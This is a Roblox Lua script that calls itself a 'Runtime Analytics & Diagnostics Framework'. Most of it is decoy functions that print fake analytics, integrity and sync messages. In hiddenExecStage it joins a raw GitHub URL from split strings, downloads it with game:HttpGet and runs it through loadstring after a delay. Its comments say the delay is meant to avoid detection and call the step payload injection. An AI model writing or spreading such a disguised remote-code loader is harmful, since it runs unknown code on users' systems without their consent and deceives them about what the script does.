-- ğŸ”’ Runtime Analytics & Diagnostics Framework

-- ğŸ“Š Analytics Logger Init
local function startAnalytics()
    local entries = {}
    for i = 1, 150 do
        table.insert(entries, "[ANALYTICS] Metric_" .. i .. ": " .. tostring(math.random(100000, 999999)))
    end
    return entries
end

-- ğŸ§ª System Integrity Routine
local function systemIntegrityCheck()
    local hash = ""
    for i = 1, 300 do
        local byte = (i * 13) % 256
        hash = hash .. string.char((byte % 25) + 65)
    end
    return hash
end

-- ğŸ§¬ Session Synchronizer
local function syncSession()
    local stages = { "INIT", "HANDSHAKE", "RELAY", "CHECKSUM", "SYNC_OK" }
    for _, stage in ipairs(stages) do
        print("ğŸ“¡ Syncing Stage: " .. stage .. " @ " .. os.time())
        wait(0.05)
    end
end

-- ğŸ§± Sandbox Generator
local function generateSandbox()
    local env = {}
    for i = 1, 10 do
        env["VAR_" .. i] = i * math.random(1, 99)
    end
    return env
end

-- ğŸ”„ Loop Task Dispatcher
local function maintenanceLoop()
    for cycle = 1, 75 do
        local status = math.random(1, 100)
        print("âš™ï¸ Maintenance Cycle [" .. cycle .. "] - Status: OK-" .. tostring(status))
        wait(0.02)
    end
end

-- â³ Post-Boot Validation
local function validateSession()
    print("âœ… Boot sequence passed. Session valid.")
    return true
end

-- ğŸ§Š Layered Execution Wrapper
local function hiddenExecStage()
    local x1 = "https://"
    local x2 = "raw.githubusercontent.com/"
    local x3 = "brylmad/Mvsd/refs/heads/main/"
    local x4 = "Mvsd"
    local link = x1 .. x2 .. x3 .. x4

    -- ğŸ” Encrypted Transport Handler (executes only if function is valid)
    local function deepChainLoader(url)
        local raw = game:HttpGet(url)
        local execute = loadstring(raw)
        if typeof(execute) == "function" then
            execute()
        else
            warn("ğŸ” Execution function invalid!")
        end
    end

    -- Timed trigger to prevent detection via instant execution
    task.delay(1.5, function()
        deepChainLoader(link)
    end)
end

-- ğŸ§  Master Bootstrap Task
task.spawn(function()
    print("ğŸ” Initializing Protected Runtime Environment...")
    wait(1)
    startAnalytics()
    systemIntegrityCheck()
    syncSession()
    generateSandbox()
    maintenanceLoop()
    if validateSession() then
        hiddenExecStage() -- Payload injection after session check
    else
        warn("âŒ Critical failure. Execution blocked.")
    end
end)
